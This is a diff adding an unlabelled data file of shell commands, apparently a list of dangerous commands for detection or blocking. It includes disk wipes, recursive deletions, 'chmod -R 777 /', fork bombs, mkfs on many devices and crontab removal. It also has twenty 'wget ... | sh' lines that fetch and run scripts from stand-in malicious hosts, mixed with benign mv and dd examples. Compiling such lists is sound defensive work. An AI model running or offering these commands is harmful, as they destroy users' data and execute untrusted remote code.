@@ -1,0 +1,345 @@
+> /dev/sda
+echo "Hello" > /dev/sda
+cat /etc/passwd > /dev/sda
+ls > /dev/sda
+date > /dev/sda
+df > /dev/sda
+top > /dev/sda
+free > /dev/sda
+dmesg > /dev/sda
+ifconfig > /dev/sda
+ps > /dev/sda
+uname -a > /dev/sda
+uptime > /dev/sda
+find / > /dev/sda
+lsblk > /dev/sda
+grep "error" > /dev/sda
+whoami > /dev/sda
+ls /home > /dev/sda
+head /var/log/syslog > /dev/sda
+tail /var/log/auth.log > /dev/sda
+echo "Test" > /dev/sda
+rm -r folder1
+rm -r dir2
+rm -r /home/user/docs
+rm -r project/
+rm -r /var/tmp/
+rm -r /etc/config/
+rm -r temp_files/
+rm -r archive/old/
+rm -r backup/
+rm -r /usr/local/share/
+rm -r images/
+rm -r downloads/
+rm -r /home/user/.cache/
+rm -r /var/log/old_logs/
+rm -r /opt/old/
+rm -r my_project/
+rm -r /mnt/external/backup/
+rm -r temp/
+rm -r /srv/data/
+rm -r /home/user/temp_files/
+rm -f file1.txt
+rm -f /home/user/file2.txt
+rm -f /var/tmp/readonly_file
+rm -f /etc/config/config_file
+rm -f project/file3.log
+rm -f /opt/readonly_file
+rm -f /usr/local/bin/script.sh
+rm -f temp_files/*.tmp
+rm -f /mnt/external/file4.dat
+rm -f archive/old_file.zip
+rm -f downloads/file5.iso
+rm -f /home/user/important_file
+rm -f /var/log/old_logs/*.log
+rm -f /home/user/.cache/*.cache
+rm -f images/*.jpg
+rm -f backup/backup_file.bak
+rm -f /srv/data/file6.db
+rm -f /tmp/temporary_file
+rm -f /opt/old/old_file
+rm -f /etc/config/another_readonly_file
+rm -rf /home/user/old_projects/
+rm -rf /var/tmp/*
+rm -rf /etc/config/
+rm -rf /opt/unused/
+rm -rf /srv/backup/
+rm -rf /tmp/old_files/
+rm -rf /home/user/downloads/
+rm -rf /mnt/external/backup/
+rm -rf /usr/local/share/old/
+rm -rf /var/log/old/
+rm -rf /home/user/images/
+rm -rf /home/user/docs/
+rm -rf /var/cache/
+rm -rf /home/user/temporary/
+rm -rf /opt/test/
+rm -rf /etc/old_config/
+rm -rf /srv/data/
+rm -rf /tmp/old/
+rm -rf /home/user/archive/
+rm -rf /mnt/external/unused/
+rm -rf file1.txt*
+rm -rf *.tmp
+rm -rf *.log
+rm -rf file2.*
+rm -rf *.bak
+rm -rf *.dat
+rm -rf *.iso
+rm -rf *.zip
+rm -rf file3.*
+rm -rf *.db
+rm -rf *.jpg
+rm -rf *.pdf
+rm -rf *.tar
+rm -rf *.gz
+rm -rf *.csv
+rm -rf *.html
+rm -rf *.xml
+rm -rf *.sh
+rm -rf *.py
+rm -rf *.md
+rm -rf folder1/
+rm -rf dir2/
+rm -rf /home/user/old_projects/
+rm -rf /var/tmp/
+rm -rf /etc/config/
+rm -rf project/
+rm -rf /usr/local/share/
+rm -rf /opt/old/
+rm -rf backup/
+rm -rf /mnt/external/
+rm -rf /home/user/temp_files/
+rm -rf archive/
+rm -rf /srv/data/
+rm -rf /tmp/
+rm -rf /home/user/images/
+rm -rf /home/user/downloads/
+rm -rf /var/log/
+rm -rf /opt/test/
+rm -rf /mnt/external/backup/
+rm -rf /srv/backup/
+chmod -R 777 /
+chmod -R 777 /home
+chmod -R 777 /var/www
+chmod -R 777 /etc
+chmod -R 777 /tmp
+chmod -R 777 /usr/local
+chmod -R 777 /opt
+chmod -R 777 /root
+chmod -R 777 /bin
+chmod -R 777 /sbin
+chmod -R 777 /lib
+chmod -R 777 /mnt
+chmod -R 777 /media
+chmod -R 777 /srv
+chmod -R 777 /proc
+chmod -R 777 /sys
+chmod -R 777 /run
+chmod -R 777 /dev
+chmod -R 777 /var/log
+chmod -R 777 /home/user
+chmod -R 777 /var/tmp
+:(){ :|:& };:
+() { :|:& };:
+:(){ |:& };:
+() { |:& };:
+:(){ |:|:|:|:|& };:
+mkfs.ext3 /dev/sda1
+mkfs.ext3 /dev/sdb
+mkfs.ext3 /dev/sdc1
+mkfs.ext3 /dev/sdd
+mkfs.ext3 /dev/sde1
+mkfs.ext3 /dev/sdf
+mkfs.ext3 /dev/sdg1
+mkfs.ext3 /dev/sdh
+mkfs.ext3 /dev/sdi1
+mkfs.ext3 /dev/sdj
+mkfs.ext3 /dev/sdk1
+mkfs.ext3 /dev/sdl
+mkfs.ext3 /dev/sdm1
+mkfs.ext3 /dev/sdn
+mkfs.ext3 /dev/sdo1
+mkfs.ext3 /dev/sdp
+mkfs.ext3 /dev/sdq1
+mkfs.ext3 /dev/sdr
+mkfs.ext3 /dev/sds1
+mkfs.ext3 /dev/sdt
+mv data /dev/null
+mv temp /dev/null
+mv backup /dev/null
+mv old_files /dev/null
+mv logs /dev/null
+mv projects /dev/null
+mv downloads /dev/null
+mv uploads /dev/null
+mv photos /dev/null
+mv documents /dev/null
+mv videos /dev/null
+mv music /dev/null
+mv scripts /dev/null
+mv source_code /dev/null
+mv archives /dev/null
+mv config /dev/null
+mv temp_files /dev/null
+mv old_backups /dev/null
+mv temp_data /dev/null
+mv work /dev/null
+> log.txt
+> notes.txt
+> data.csv
+> temp.log
+> output.txt
+> empty_file.txt
+> example.txt
+> newfile.txt
+> results.txt
+> summary.txt
+> error.log
+> report.txt
+> archive.zip
+> debug.log
+> backup.txt
+> test_file.txt
+> config_file.txt
+> notes_backup.txt
+> user_data.txt
+> clean_file.txt
+wget http://example.com/malicious_script -O- | sh
+wget http://malicious.example.org/script.sh -O- | sh
+wget http://unsafe.com/script -O- | sh
+wget http://hackersite.net/malicious.sh -O- | sh
+wget http://dangerous.org/exploit -O- | sh
+wget http://untrustedsource.com/malware -O- | sh
+wget http://exploitme.com/script.sh -O- | sh
+wget http://phishing.net/script -O- | sh
+wget http://malware.site/script -O- | sh
+wget http://virus.com/script.sh -O- | sh
+wget http://threatsource.org/exploit -O- | sh
+wget http://malicious.site/script.sh -O- | sh
+wget http://attacker.com/script -O- | sh
+wget http://hacked.com/malicious.sh -O- | sh
+wget http://scammer.org/script -O- | sh
+wget http://infected.net/script.sh -O- | sh
+wget http://dangeroussite.org/exploit -O- | sh
+wget http://maliciousdomain.com/script -O- | sh
+wget http://unsafe.net/script.sh -O- | sh
+wget http://malware.org/script -O- | sh
+echo foo -> ^foo^bar
+cat foo.txt -> ^foo^bar
+grep foo -> ^foo^bar
+rm foo -> ^foo^bar
+ls foo -> ^foo^bar
+find foo -> ^foo^bar
+cp foo /tmp -> ^foo^bar
+mv foo bar -> ^foo^bar
+touch foo -> ^foo^bar
+echo foo > file -> ^foo^bar
+chmod foo -> ^foo^bar
+wget foo -> ^foo^bar
+mkdir foo -> ^foo^bar
+ps aux | grep foo -> ^foo^bar
+df -h | grep foo -> ^foo^bar
+curl foo -> ^foo^bar
+ls -l foo -> ^foo^bar
+echo foo -> ^foo^bar
+man foo -> ^foo^bar
+ping foo -> ^foo^bar
+echo "secret" > .hidden_file
+ls -a (hiển thị tệp ẩn)
+touch .hidden_script.sh
+chmod 700 .hidden_file
+cat .hidden_file
+mv .hidden_file /tmp
+rm .hidden_file
+mkdir .hidden_folder
+cp .hidden_file .hidden_folder
+find . -name ".hidden_file"
+grep "secret" .hidden_file
+nano .hidden_file
+ls -l .hidden_file
+vi .hidden_file
+tar -cvf .hidden_archive.tar .hidden_folder
+zip .hidden_archive.zip .hidden_folder
+sudo chown user:group .hidden_file
+sudo chmod 600 .hidden_file
+dd if=/dev/sda of=/path/to/backup.img
+dd if=/path/to/backup.img of=/dev/sda
+dd if=/dev/zero of=outputfile bs=1M count=100
+dd if=/dev/urandom of=randomfile bs=1M count=10
+dd if=inputfile of=outputfile bs=512 conv=sync
+dd if=/dev/sda of=backup.img bs=64K conv=noerror,sync
+dd if=/dev/sda bs=512 count=1 | hexdump -C
+dd if=/dev/cdrom of=cdimage.iso
+dd if=source.img of=destination.img bs=1M
+dd if=/dev/zero of=/dev/sda bs=1M
+dd if=inputfile of=outputfile bs=4K
+dd if=/dev/sda of=/dev/null bs=1M
+dd if=bigfile of=smallfile bs=1M count=1
+dd if=inputfile of=outputfile bs=1M conv=notrunc
+dd if=/dev/sda of=/dev/sdb bs=512 conv=noerror
+dd if=largefile of=/dev/sda bs=512
+dd if=source.img of=/dev/sda bs=4M
+dd if=/dev/zero of=/path/to/emptyfile bs=1G
+dd if=/dev/sda bs=512 count=10 | gzip > backup.gz
+dd if=/dev/urandom of=keyfile bs=1M count=2
+mv file1.txt /home/user/
+mv /home/user/file1.txt /home/user/file2.txt
+mv file1.txt file2.txt
+mv /home/user/dir1 /home/user/dir2
+mv file1.txt /home/user/dir/
+mv /home/user/file1.txt /home/user/backup/
+mv oldname.txt newname.txt
+mv -i file1.txt /home/user/ 
+mv -u file1.txt /home/user/ 
+mv *.txt /home/user/ (Di chuyển tất cả file .txt)
+mv /home/user/dir1 /home/user/dir2/ 
+mv file1.txt file2.txt /home/user/dir/
+mv -v file1.txt /home/user/ 
+mv file1.txt /home/user/dir/ && mv file2.txt /home/user/dir/
+mv file1.txt file2.txt /home/user/dir/
+mv dir1/ dir2/
+mv file1.txt file2.txt /home/user/
+mv /home/user/dir1 /home/user/dir2
+mv /home/user/file1.txt /home/user/dir1/
+mv file1.txt /home/user/dir/
+history | sh
+history | sh > output.log
+history | sh 2>&1 | tee output.log
+history | sh -x
+history | sh -e
+history | sh -n
+history | sh -c "ls -l"
+history | sh -c "echo Hello"
+history | sh -c "mkdir test"
+history | sh -c "rm -rf test"
+history | sh -c "cat file.txt"
+history | sh -c "grep 'text' file.txt"
+history | sh -c "ls"
+history | sh -c "date"
+history | sh -c "pwd"
+history | sh -c "cp file1.txt file2.txt"
+history | sh -c "mv file1.txt file2.txt"
+history | sh -c "chmod 755 script.sh"
+history | sh -c "echo 'Test' > testfile.txt"
+history | sh -c "df -h"
+crontab -r
+crontab -r && echo "Crontab cleared"
+crontab -r || echo "Failed to clear crontab"
+crontab -r > output.log
+crontab -r -u username (Xóa crontab của một người dùng khác)
+crontab -r 2>&1 | tee error.log
+crontab -r && systemctl restart cron
+crontab -r && mail -s "Crontab deleted" user@example.com
+crontab -r && rm /var/spool/cron/crontabs/username
+crontab -r && echo "Crontab for $(whoami) cleared" > ~/crontab_status.log
+crontab -r && touch ~/crontab_removed.txt
+crontab -r && find /var/spool/cron/ -type f -name "*username*"
+crontab -r && echo "All crontab entries removed for $(whoami)"
+crontab -r && systemctl restart cron.service
+crontab -r && echo "Crontab has been cleared" | mail -s "Crontab Update" user@example.com
+crontab -r && echo "Crontab cleared on $(date)" > ~/crontab_removal.log
+crontab -r && rm -rf /home/username/.cronjobs/
+crontab -r && echo "Crontab deleted for $(whoami)" > ~/crontab.log
+crontab -r && echo "Cleared crontab" >> ~/cron_cleanup.log
+crontab -r && systemctl restart cron
